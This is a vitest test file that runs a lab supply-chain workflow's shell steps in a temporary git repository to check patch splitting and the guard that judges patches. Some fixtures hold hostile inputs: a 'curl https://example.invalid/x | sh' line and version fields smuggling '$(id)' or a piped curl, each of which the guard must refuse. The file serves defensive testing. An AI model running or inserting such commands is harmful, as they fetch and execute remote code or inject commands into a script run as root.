/**
 * The lab supply-chain workflow's own shell, run for real (#1308).
 *
 * lab-pin-pr-workflows.test.mjs reads the workflow as text. That cannot tell
 * a patch that holds one set's edits from one that holds two, and a reviewer
 * who put each of three plausible mistakes back found it still green. This
 * file takes the `run:` blocks out of the workflow file, runs them with bash
 * in a temporary git repository, and looks at the patches that come out. The
 * bump scripts the blocks call are small stand-ins that edit the files the
 * real planners edit; what is under test is the workflow's shell: the order
 * of the sets, the per-set patches, the guards, and the judging step the
 * App-token job runs before it applies a patch.
 *
 * It needs bash and git; it is skipped where either is missing.
 */
import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { spawnSync } from 'node:child_process';
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync, existsSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';

const REPO = join(dirname(fileURLToPath(import.meta.url)), '..');
const WORKFLOW = readFileSync(join(REPO, '.github', 'workflows', 'lab-supply-chain.yml'), 'utf8');

const has = (cmd) => spawnSync(cmd, ['--version'], { encoding: 'utf8' }).status === 0;
const runnable = has('bash') && has('git');

/** One job's text, from its key to the next job's key. */
function jobText(name, next) {
  const at = (key) => {
    const index = WORKFLOW.indexOf(`\n  ${key}:\n`);
    if (index === -1) throw new Error(`no job ${key}`);
    return index;
  };
  return WORKFLOW.slice(at(name), next ? at(next) : undefined);
}

/** The `run: |` body of the step called `name` in `job`, dedented to column 0. */
function runBlock(job, name) {
  const start = job.indexOf(`- name: ${name}\n`);
  if (start === -1) throw new Error(`no step "${name}"`);
  const rest = job.slice(start + 1);
  const next = rest.indexOf('\n      - name:');
  const step = next === -1 ? rest : rest.slice(0, next);
  const at = step.indexOf('run: |\n');
  if (at === -1) throw new Error(`step "${name}" has no run block`);
  return step
    .slice(at + 'run: |\n'.length)
    .split('\n')
    .map((line) => line.replace(/^ {10}/, ''))
    .join('\n');
}

const PROPOSE = jobText('propose', 'pull-request');
const PULL_REQUEST = jobText('pull-request', 'check');
const CHECK = jobText('check');

/** The files each set may touch, as open-lab-pin-pr.mjs records them before anything runs. */
const PATHS = {
  host: ['lab-host/ansible/group_vars/all.yml', 'lab-host/bootstrap.sh'],
  'image-base': ['lab-image/versions.env', 'lab-image/Dockerfile'],
  'image-tools': ['lab-image/versions.env', 'lab-image/README.md'],
};

// Stand-ins for the two scripts the blocks call. They edit what the real
// planners edit, one set at a time, so the shell around them is what is tested.
const STUB_UPSTREAM = `
import { readFileSync, writeFileSync } from 'node:fs';
const argv = process.argv.slice(2);
// The check job's call: write a summary and exit with the code the check gives
// (0 every pin current, 1 at least one behind, 2 a source could not be read).
if (argv.includes('--summary')) {
  writeFileSync(argv[argv.indexOf('--summary') + 1], '| Component | Status |\\n| x | BEHIND |\\n');
  process.exit(Number(process.env.STUB_PINS_EXIT || 0));
}
const set = argv[argv.indexOf('--bump') + 1];
const skip = (process.env.STUB_SKIP || '').split(',');
const edit = (file, from, to) => {
  const text = readFileSync(file, 'utf8');
  if (!text.includes(from)) throw new Error('stub: ' + from + ' is not in ' + file);
  writeFileSync(file, text.replace(from, to));
};
if (!skip.includes(set)) {
  if (set === 'image-base') {
    edit('lab-image/versions.env', 'BASE_DIGEST=old', 'BASE_DIGEST=new');
    edit('lab-image/Dockerfile', 'FROM base@old', 'FROM base@new');
  }
  if (set === 'image-tools') {
    edit('lab-image/versions.env', 'TERRAFORM_VERSION=1.0.0', 'TERRAFORM_VERSION=1.0.1');
    if (process.env.STUB_TOOLS_TOUCH_DOCKERFILE) edit('lab-image/Dockerfile', 'FROM base@old', 'FROM base@sneaky');
    if (process.env.STUB_TOOLS_LEAVE_FILE) writeFileSync('stray.txt', 'left behind\\n');
  }
  if (set === 'host') {
    edit('lab-host/ansible/group_vars/all.yml', 'engine: 1', 'engine: 2');
    edit('lab-host/bootstrap.sh', 'COSIGN_VERSION=3.1.3', 'COSIGN_VERSION=3.1.4');
  }
}
console.log('stub bumped ' + set);
`;

// The other script the blocks call: it prints the files a set may touch, from the
// table the test passes in, the way open-lab-pin-pr.mjs --paths prints SETS[set].paths.
const STUB_PATHS_SCRIPT = `
const set = process.argv[process.argv.indexOf('--paths') + 1];
const paths = JSON.parse(process.env.STUB_PATHS)[set];
if (!paths) { console.error('stub: no set ' + set); process.exit(2); }
console.log(paths.join('\\n'));
`;

const FILES = {
  'lab-image/versions.env': 'BASE_DIGEST=old\nSANDBOX_BASE_DIGEST=sb\nTERRAFORM_VERSION=1.0.0\nHELM_VERSION=4.0.0\n',
  'lab-image/Dockerfile': 'FROM base@old\n',
  'lab-image/README.md': 'The mirror holds azurerm 5.9.0.\n',
  'lab-host/ansible/group_vars/all.yml': 'engine: 1\n',
  // The "-- keep me" line is there so a test can remove a line that starts with dashes.
  'lab-host/bootstrap.sh': `#!/bin/bash\n-- keep me\nCOSIGN_VERSION=3.1.3\nCOSIGN_SHA256=${'a'.repeat(64)}\necho hi\n`,
  '.github/workflows/x.yml': 'a\n',
  'scripts/lab-pins-upstream.mjs': STUB_UPSTREAM,
  'scripts/open-lab-pin-pr.mjs': STUB_PATHS_SCRIPT,
};

const forward = (p) => p.replace(/\\/g, '/');

let work;
let temp;
beforeEach(() => {
  work = forward(mkdtempSync(join(tmpdir(), 'lab-sc-work-')));
  temp = forward(mkdtempSync(join(tmpdir(), 'lab-sc-temp-')));
});
afterEach(() => {
  rmSync(work, { recursive: true, force: true });
  rmSync(temp, { recursive: true, force: true });
});

/**
 * Run a step's script the way the runner does: a `run:` step with no `shell:`
 * is `bash -e {0}`, so a command that fails ends the step unless the script
 * handles the failure itself. Running it without -e would hide exactly that.
 */
function sh(script, { cwd, env = {} }) {
  const path = `${forward(dirname(process.execPath))}:${process.env.PATH}`;
  return spawnSync('bash', ['-e', '-c', script], {
    cwd,
    encoding: 'utf8',
    env: { ...process.env, PATH: path, GITHUB_STEP_SUMMARY: '/dev/null', ...env },
  });
}

/** A repository holding the files above, committed. */
function seed() {
  for (const [file, text] of Object.entries(FILES)) {
    mkdirSync(dirname(join(work, file)), { recursive: true });
    writeFileSync(join(work, file), text);
  }
  const git = (args) => {
    const r = spawnSync('git', args, { cwd: work, encoding: 'utf8' });
    if (r.status !== 0) throw new Error(`git ${args.join(' ')}: ${r.stderr}`);
  };
  git(['init', '-q']);
  git(['config', 'core.autocrlf', 'false']);
  git(['config', 'core.fileMode', 'false']);
  git(['config', 'user.email', 'test@example.invalid']);
  git(['config', 'user.name', 'test']);
  git(['add', '-A']);
  git(['commit', '-q', '-m', 'seed']);
}

/**
 * Run the steps of `propose` that record each set's paths, plan the bumps and
 * cut the patches. The Docker CLI fixture step downloads a binary, and the
 * guard that follows it only looks at the host edits; both are left out.
 */
function propose(env = {}) {
  const common = { RUNNER_TEMP: temp, STUB_PATHS: JSON.stringify(PATHS), ...env };
  const record = sh(runBlock(PROPOSE, "Record each set's paths before anything downloaded runs"), { cwd: work, env: common });
  if (record.status !== 0) return { plan: record };
  const plan = sh(runBlock(PROPOSE, 'Plan and make the bumps'), { cwd: work, env: common });
  if (plan.status !== 0) return { plan };
  const output = join(temp, 'github-output.txt');
  const cut = sh(runBlock(PROPOSE, 'One patch per set'), { cwd: work, env: { RUNNER_TEMP: temp, GITHUB_OUTPUT: output, ...env } });
  const sets = existsSync(output) ? readFileSync(output, 'utf8').match(/^sets=(.*)$/m)?.[1] : undefined;
  return { plan, cut, sets: sets === undefined ? undefined : JSON.parse(sets) };
}

const patch = (set) => readFileSync(join(temp, 'lab-pins', `${set}.patch`), 'utf8');
/** Only the lines a patch adds or removes, without the file headers. */
const changed = (text) => text.split('\n').filter((l) => /^[-+]/.test(l) && !/^(---|\+\+\+) /.test(l));

describe.skipIf(!runnable)('lab-supply-chain.yml, propose: the steps run for real', () => {
  beforeEach(seed);

  it('cuts one patch per set, so the two sets that share versions.env do not carry each other’s lines', () => {
    const { plan, cut, sets } = propose();
    expect(plan.status, plan.stderr).toBe(0);
    expect(cut.status, cut.stderr).toBe(0);
    expect(sets).toEqual(['host', 'image-base', 'image-tools']);
    // image-base: its own two lines in two files, and no Terraform line.
    expect(changed(patch('image-base')).sort()).toEqual(['+BASE_DIGEST=new', '+FROM base@new', '-BASE_DIGEST=old', '-FROM base@old']);
    // image-tools: only the Terraform lines, and no base digest line.
    expect(changed(patch('image-tools'))).toEqual(['-TERRAFORM_VERSION=1.0.0', '+TERRAFORM_VERSION=1.0.1']);
    // host: its two files.
    expect(changed(patch('host')).sort()).toEqual(['+COSIGN_VERSION=3.1.4', '+engine: 2', '-COSIGN_VERSION=3.1.3', '-engine: 1']);
  });

  it('leaves the checkout holding only the host edits, which the Docker CLI fixture step needs', () => {
    propose();
    const status = spawnSync('git', ['status', '--porcelain'], { cwd: work, encoding: 'utf8' })
      .stdout.split('\n')
      .filter(Boolean)
      .sort();
    expect(status).toEqual([' M lab-host/ansible/group_vars/all.yml', ' M lab-host/bootstrap.sh']);
  });

  it('leaves a set that made no edit out of the list of sets with a bump', () => {
    const { sets } = propose({ STUB_SKIP: 'image-tools' });
    expect(sets).toEqual(['host', 'image-base']);
    expect(patch('image-tools')).toBe('');
    // ... and the others are unchanged by its silence.
    expect(changed(patch('image-base'))).toHaveLength(4);
  });

  it('lists no set at all on a quiet week', () => {
    const { sets } = propose({ STUB_SKIP: 'host,image-base,image-tools' });
    expect(sets).toEqual([]);
  });

  it('fails the run when a set edits a file that belongs to another set', () => {
    const { plan } = propose({ STUB_TOOLS_TOUCH_DOCKERFILE: '1' });
    expect(plan.status).not.toBe(0);
    expect(plan.stdout + plan.stderr).toContain('The image-tools bump changed paths outside its own set: lab-image/Dockerfile');
  });

  it('fails the run when a set leaves a file the checkout did not have', () => {
    const { plan } = propose({ STUB_TOOLS_LEAVE_FILE: '1' });
    expect(plan.status).not.toBe(0);
    expect(plan.stdout + plan.stderr).toContain('stray.txt');
  });

  // A guard that reads `git status` must fail when git cannot answer, not read
  // an empty answer as "nothing changed". A stand-in git in front of the real
  // one refuses only `status`; everything else it hands on.
  it('fails the run when git status itself fails, so the guards fail closed', () => {
    const realGit = spawnSync('bash', ['-c', 'command -v git'], { encoding: 'utf8' }).stdout.trim();
    const shim = join(temp, 'bin');
    mkdirSync(shim, { recursive: true });
    writeFileSync(join(shim, 'git'), `#!/bin/bash\nif [ "$1" = status ]; then echo "fatal: simulated" >&2; exit 128; fi\nexec "${realGit}" "$@"\n`, { mode: 0o755 });
    const { plan } = propose({ PATH: `${shim}:${forward(dirname(process.execPath))}:${process.env.PATH}` });
    expect(plan.status).not.toBe(0);
    expect(plan.stdout + plan.stderr).toContain('simulated');
  });

  it('fails the run when a bump script fails, rather than carrying on with the sets after it', () => {
    writeFileSync(join(work, 'scripts', 'lab-pins-upstream.mjs'), "process.exit(2);\n");
    const { plan } = propose();
    expect(plan.status).not.toBe(0);
  });
});

describe.skipIf(!runnable)('lab-supply-chain.yml, pull-request: the patch is judged before it is applied', () => {
  beforeEach(seed);

  const git = (...args) => {
    const r = spawnSync('git', args, { cwd: work, encoding: 'utf8' });
    if (r.status !== 0) throw new Error(`git ${args.join(' ')}: ${r.stderr}`);
    return r.stdout;
  };
  const edit = (file, from, to) => writeFileSync(join(work, file), readFileSync(join(work, file), 'utf8').replace(from, to));

  /** The patch git itself writes for a change to the seeded files, so it is well formed by construction. */
  function realPatch(mutate) {
    mutate();
    git('add', '-A');
    return git('diff', '--cached', '--binary');
  }

  const cosign = () => {
    edit('lab-host/bootstrap.sh', 'COSIGN_VERSION=3.1.3', 'COSIGN_VERSION=3.1.4');
    edit('lab-host/bootstrap.sh', `COSIGN_SHA256=${'a'.repeat(64)}`, `COSIGN_SHA256=${'b'.repeat(64)}`);
  };

  /** Run the judging step on a patch, as the App-token job does before it applies one. */
  function judge(patchText, paths = PATHS.host) {
    mkdirSync(join(temp, 'lab-pins'), { recursive: true });
    writeFileSync(join(temp, 'lab-pins', 'host.patch'), patchText);
    writeFileSync(join(temp, 'lab-pins', 'paths-host.txt'), `${paths.join('\n')}\n`);
    return sh(runBlock(PULL_REQUEST, "The patch touches only this set's recorded paths, and no code this job runs"), {
      cwd: work,
      env: { RUNNER_TEMP: temp, SET: 'host' },
    });
  }
  const output = (r) => r.stdout + r.stderr;
  const REFUSED = 'other than its COSIGN_VERSION and COSIGN_SHA256 lines; refused';

  it('accepts a patch that moves only the two cosign lines of bootstrap.sh', () => {
    const r = judge(realPatch(cosign));
    expect(r.status, output(r)).toBe(0);
    expect(r.stdout).toContain('Patched: lab-host/bootstrap.sh');
  });

  it('accepts the whole host patch the workflow itself cuts: group_vars and the cosign lines', () => {
    const { cut } = propose();
    expect(cut.status, output(cut)).toBe(0);
    const r = judge(patch('host'));
    expect(r.status, output(r)).toBe(0);
    expect(r.stdout).toContain('lab-host/ansible/group_vars/all.yml');
  });

  it('refuses a patch that adds any other line to bootstrap.sh, the script the owner runs as root', () => {
    const r = judge(
      realPatch(() => {
        cosign();
        edit('lab-host/bootstrap.sh', 'echo hi', 'echo hi\ncurl https://example.invalid/x | sh');
      })
    );
    expect(r.status).not.toBe(0);
    expect(output(r)).toContain(REFUSED);
  });

  // The two lines may change only to the shapes the bumper writes. A filter
  // that checks how a line starts lets a command ride along on the value.
  it.each([
    ['a command after the version', 'COSIGN_VERSION=', 'COSIGN_VERSION=3.1.4; curl https://example.invalid/x | sh'],
    ['a command substitution as the version', 'COSIGN_VERSION=', 'COSIGN_VERSION=$(id)'],
    ['a backtick in the version', 'COSIGN_VERSION=', 'COSIGN_VERSION=3.1.4`id`'],
    ['trailing space after the version', 'COSIGN_VERSION=', 'COSIGN_VERSION=3.1.4 '],
    ['a letter in the version', 'COSIGN_VERSION=', 'COSIGN_VERSION=3.1.4a'],
    ['a command substitution as the checksum', 'COSIGN_SHA256=', 'COSIGN_SHA256=$(id)'],
    ['a command after the checksum', 'COSIGN_SHA256=', `COSIGN_SHA256=${'b'.repeat(64)}; id`],
    ['a checksum that is too short', 'COSIGN_SHA256=', 'COSIGN_SHA256=bbbb'],
    ['a checksum that is too long', 'COSIGN_SHA256=', `COSIGN_SHA256=${'b'.repeat(65)}`],
    ['an upper-case checksum', 'COSIGN_SHA256=', `COSIGN_SHA256=${'B'.repeat(64)}`],
  ])('refuses %s on a cosign line', (_label, key, replacement) => {
    const r = judge(
      realPatch(() => {
        const file = join(work, 'lab-host/bootstrap.sh');
        const lines = readFileSync(file, 'utf8').split('\n');
        writeFileSync(file, lines.map((line) => (line.startsWith(key) ? replacement : line)).join('\n'));
      })
    );
    expect(r.status).not.toBe(0);
    expect(output(r)).toContain(REFUSED);
  });

  it('refuses a removed line that merely starts with dashes, which a header filter would have hidden', () => {
    const r = judge(realPatch(() => edit('lab-host/bootstrap.sh', '-- keep me\n', '')));
    expect(r.status).not.toBe(0);
    expect(output(r)).toContain(REFUSED);
  });

  it('refuses a mode change on bootstrap.sh', () => {
    const r = judge(
      realPatch(() => {
        cosign();
        git('update-index', '--add', '--chmod=+x', 'lab-host/bootstrap.sh');
      })
    );
    expect(r.status).not.toBe(0);
    expect(output(r)).toContain(REFUSED);
  });

  it('refuses a binary change to bootstrap.sh', () => {
    const r = judge(realPatch(() => writeFileSync(join(work, 'lab-host/bootstrap.sh'), Buffer.from([0x00, 0x01, 0x02, 0xff]))));
    expect(r.status).not.toBe(0);
    expect(output(r)).toContain(REFUSED);
  });

  it('still refuses a patch that touches a path outside the set', () => {
    const r = judge(
      realPatch(() => {
        cosign();
        edit('lab-image/Dockerfile', 'FROM base@old', 'FROM base@new');
      })
    );
    expect(r.status).not.toBe(0);
    expect(output(r)).toContain('outside the set recorded for it');
  });

  it('still refuses a patch that touches a workflow, even one listed in the set', () => {
    const r = judge(realPatch(() => edit('.github/workflows/x.yml', 'a', 'b')), ['.github/workflows/x.yml']);
    expect(r.status).not.toBe(0);
    expect(output(r)).toContain('a workflow or a script this job could run; refused');
  });

  it('does not look at bootstrap.sh when the patch does not touch it', () => {
    const r = judge(realPatch(() => edit('lab-host/ansible/group_vars/all.yml', 'engine: 1', 'engine: 2')));
    expect(r.status, output(r)).toBe(0);
  });
});

// The check job reads the exit code of `lab-pins-upstream.mjs --summary` (0 every
// pin current, 1 at least one behind, 2 a source could not be read) and acts on
// it in later steps. The runner starts a `run:` step with `bash -e`, so a step
// that does not handle the code itself ends at the first non-zero exit, before
// it records it: every later step is then skipped, including the scan of the
// published images and the weekly issue. Three runs failed that way (#1308),
// each one on a week with a pin behind.
describe.skipIf(!runnable)('lab-supply-chain.yml, check: the pin check step records its exit code', () => {
  beforeEach(seed);

  function pinsStep(code) {
    const output = join(temp, 'github-output.txt');
    const r = sh(runBlock(CHECK, 'Pins against upstream'), {
      cwd: work,
      env: { RUNNER_TEMP: temp, GITHUB_OUTPUT: output, STUB_PINS_EXIT: String(code) },
    });
    const recorded = existsSync(output) ? readFileSync(output, 'utf8').match(/^exit=(.*)$/m)?.[1] : undefined;
    return { r, recorded };
  }

  it.each([
    [0, 'every pin is current'],
    [1, 'at least one pin is behind'],
    [2, 'a source could not be read'],
  ])('finishes and records exit=%i when %s, so the later steps run and decide what to do', (code) => {
    const { r, recorded } = pinsStep(code);
    expect(r.status, r.stdout + r.stderr).toBe(0);
    expect(recorded).toBe(String(code));
  });

  it('still hands the summary to the run page when a pin is behind', () => {
    const { r } = pinsStep(1);
    expect(r.status, r.stdout + r.stderr).toBe(0);
    expect(existsSync(join(temp, 'pins.md'))).toBe(true);
  });
});
